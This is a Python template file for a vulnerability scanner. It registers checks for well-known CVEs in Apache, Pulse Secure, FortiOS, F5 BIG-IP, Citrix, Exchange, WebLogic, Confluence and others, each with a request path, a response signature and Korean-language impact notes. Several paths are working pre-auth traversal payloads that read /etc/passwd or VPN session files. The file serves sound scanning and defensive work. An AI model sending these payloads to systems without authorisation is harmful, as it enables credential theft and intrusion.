"""Known-CVE path checks with strong content signatures (very low false positive).

Most read a local file (root:.*:0:0) or a product-unique marker, so a match is
high-confidence. These are pre-auth request-based checks; confirm before report.
"""
from __future__ import annotations
from modules.templates.engine import register_templates

CAT = "Tech / CVE"
PASSWD = r"root:.*?:0:0:"


def C(i, name, path, regex, sev="high", status=(200,), impact="", fix="Apply the vendor patch immediately."):
    return {"id": i, "name": name, "type": "path", "path": path, "severity": sev,
            "category": CAT, "confidence": "Firm", "match": {"status": list(status), "regex": regex},
            "impact": impact, "remediation": fix, "desc": name}


TEMPLATES = [
    C("cve_2021_41773", "Apache 2.4.49 Path Traversal (CVE-2021-41773)",
      "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", PASSWD, "critical",
      impact="임의 파일 읽기 → RCE(모듈 활성 시)."),
    C("cve_2021_42013", "Apache 2.4.50 Path Traversal (CVE-2021-42013)",
      "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", PASSWD, "critical"),
    C("cve_2019_11510", "Pulse Secure Arbitrary File Read (CVE-2019-11510)",
      "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
      PASSWD, "critical", impact="세션/자격증명 파일 유출 → VPN 장악."),
    C("cve_2018_13379", "Fortinet FortiOS Path Traversal (CVE-2018-13379)",
      "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
      r"var fgt_lang|sslvpn_websession|[a-f0-9]{32}", "critical",
      impact="VPN 세션/자격증명 유출."),
    C("cve_2020_5902", "F5 BIG-IP TMUI File Read (CVE-2020-5902)",
      "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
      PASSWD, "critical", impact="파일 읽기 → RCE."),
    C("cve_2019_19781", "Citrix ADC Path Traversal (CVE-2019-19781)",
      "/vpn/../vpns/cfg/smb.conf", r"\[global\]|encrypt passwords|workgroup", "critical",
      impact="구성 파일 노출 → RCE 체인."),
    C("cve_2021_26855", "MS Exchange ProxyLogon SSRF (CVE-2021-26855)",
      "/owa/auth/x.js", r"X-BEResource|owa/auth", "high", status=(200, 500),
      impact="SSRF → 인증 우회 → RCE 체인."),
    C("cve_2022_22947", "Spring Cloud Gateway (CVE-2022-22947)",
      "/actuator/gateway/routes", r"route_id|predicate|filters", "high",
      impact="SpEL 주입 → RCE 가능."),
    C("cve_2021_21985", "VMware vCenter (CVE-2021-21985) endpoint",
      "/ui/h5-vsan/rest/proxy/service", r"vsan|proxy|vsphere", "high"),
    C("cve_2022_1388", "F5 BIG-IP iControl REST (CVE-2022-1388)",
      "/mgmt/tm/util/bash", r"tm:util:bash|commandResult", "critical", status=(200, 401),
      impact="인증 우회 → RCE."),
    C("cve_2023_34362", "Progress MOVEit Transfer (CVE-2023-34362) surface",
      "/human.aspx", r"MOVEit|Ipswitch", "medium", impact="SQLi→RCE 체인(패치 확인)."),
    C("cve_2021_22986", "F5 iControl REST unauth (CVE-2021-22986)",
      "/mgmt/shared/authn/login", r"iControl|generation|selfLink", "high", status=(200, 401)),
    C("cve_2020_14882", "Oracle WebLogic Console RCE (CVE-2020-14882)",
      "/console/css/%252e%252e%252fconsole.portal", r"WebLogic|console.portal|Error 403", "critical",
      status=(200, 403), impact="콘솔 우회 → RCE."),
    C("cve_2017_12617", "Apache Tomcat PUT JSP (CVE-2017-12617) surface",
      "/", r"Apache Tomcat/([789]|10)\.", "medium", impact="PUT 허용 시 JSP 업로드 RCE."),
    C("cve_2018_1000600", "Jenkins /whoAmI", "/whoAmI/", r"whoAmI|Authentication|Anonymous", "low"),
    C("cve_2015_8103", "Jenkins CLI (deserialization surface)", "/cli", r"Jenkins-CLI|Remoting", "medium",
      impact="역직렬화 RCE(구버전)."),
    C("cve_2019_3396", "Confluence Widget Connector (CVE-2019-3396)",
      "/rest/tinymce/1/macro/preview", r"Confluence|_template|velocity", "high", status=(200, 400)),
    C("cve_2022_26134", "Confluence OGNL RCE (CVE-2022-26134) surface",
      "/", r"Confluence|Atlassian", "medium", impact="OGNL 주입 RCE(패치/버전 확인)."),
]

register_templates(TEMPLATES)
